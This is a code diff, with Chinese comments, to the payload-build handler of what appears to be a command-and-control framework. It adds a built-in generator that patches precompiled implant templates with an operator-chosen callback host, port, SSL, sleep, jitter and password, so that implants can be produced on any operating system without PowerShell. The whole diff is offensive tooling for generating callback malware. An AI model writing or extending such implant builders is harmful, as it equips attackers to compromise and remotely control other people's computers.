@@ -359,6 +359,37 @@ func handlePayloadBuild(w http.ResponseWriter, r *http.Request) {
 		script = ps1v2 // 目标生成器缺失时退回 v2 那个
 	}
 
+	/* ---- 内置生成器优先 ----
+	 *
+	 * 只要该格式有内置模板, 就在这里直接产出, **完全不碰 PowerShell**。
+	 * 原先的路径是"调 ps1 脚本 -> 脚本再调 gcc", 于是生成端必须同时装 PowerShell
+	 * 与 MinGW; 服务端一旦部署到 Linux (干净的 VPS) 就断在这里
+	 * (实测报 `executable file not found in $PATH`)。
+	 *
+	 * 现在编译挪到了项目构建期 (tools/build_templates.ps1), 服务端只做字节改写,
+	 * 于是 Windows / Linux / macOS 上都能生成, 零外部依赖。
+	 *
+	 * 没有内置模板的格式 (脚本类与 v1 各格式) 仍然走下面的 ps1 兜底 ——
+	 * 在装有 PowerShell 的开发机上这些格式照常可用。 */
+	if SupportsNative(req.Format) {
+		// xform 传空: 变换链由 Malleable profile 在服务端侧决定,
+		// 生成请求里没有这个字段, PatchConfig 会填默认的 "raw"。
+		logText, nerr := buildPayloadNative(req.Format, req.Host, req.Port, req.SSL,
+			req.URI, req.Sleep, req.Jitter, "", req.Password, req.OutFile, devRoot)
+		eventLog("operator", "", "生成载荷",
+			req.Format+" "+req.Host+":"+strconv.Itoa(req.Port))
+		writeJSON(w, map[string]interface{}{
+			"ok":     nerr == nil,
+			"log":    logText,
+			"error":  errStr(nerr),
+			"out":    req.OutFile,
+			"format": req.Format,
+			"ps":     "",
+			"gen":    "内置生成器",
+		})
+		return
+	}
+
 	/* 用哪个 PowerShell: 优先 pwsh(7+, 默认 UTF-8), 退回 powershell.exe(5.1, ANSI)。
 	 *
 	 * 这里踩过一次真实的坑: powershell.exe 读**无 BOM** 的 .ps1 时按系统 ANSI 解码,
